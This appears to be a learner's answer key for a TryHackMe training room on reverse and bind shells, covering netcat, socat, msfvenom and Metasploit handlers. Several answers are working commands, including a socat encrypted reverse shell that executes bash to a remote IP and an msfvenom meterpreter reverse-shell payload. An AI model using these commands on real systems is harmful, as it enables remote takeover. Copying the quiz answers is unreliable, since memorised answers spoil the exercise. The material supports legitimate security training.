## [What the Shell?](https://tryhackme.com/r/room/introtoshells)

## Task-1: What is a shell? -- reading only 

## Task-2: Tools -- reading only 

## Task-3: Types of Shell

### Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?
Answer: R (reverse shell)

### You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)
Answer: N

### When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?
Answer: T

## Task-4: NetCat

### Which option tells netcat to listen?
Answer: -l

### How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?
Answer: nc 10.10.10.11 8080

## Task-5: Netcat Shell Stabilisation

### How would you change your terminal size to have 238 columns?
Answer: stty cols 238

### What is the syntax for setting up a Python3 webserver on port 80?
Answer: sudo python3 -m http.server 80

## Task-6: Socat

### How would we get socat to listen on TCP port 8080?
Answer: TCP-L:8080

## Task-7: Socat Encrypted Shells

### What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
Answer: socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

### socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
Answer: socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane

## Task-8: Common Shell Payloads

### What command can be used to create a named pipe in Linux?
Answer: mkfifo

## Task-9: msfvenom

### Which symbol is used to show that a shell is stageless?
Answer: _

### What command would you use to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is elf and the output filename should be shell
Answer: msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443

## Task-10: Metasploit multi/handler

### What command can be used to start a listener in the background?
Answer: exploit -j

### If we had just received our tenth reverse shell in the current Metasploit session, what would be the command used to foreground it?
Answer: sessions 10

## Task-11: WebShells  -- only reading 

## Task-12: Next Steps -- only reading

## Task-13: Practice and Examples  -- follow the instructions to learn

## Task-14: Linux Practice Box  -- use credential to login and play around to learn about shells

## Task-15: Windows Practice Box -- similar as task-14
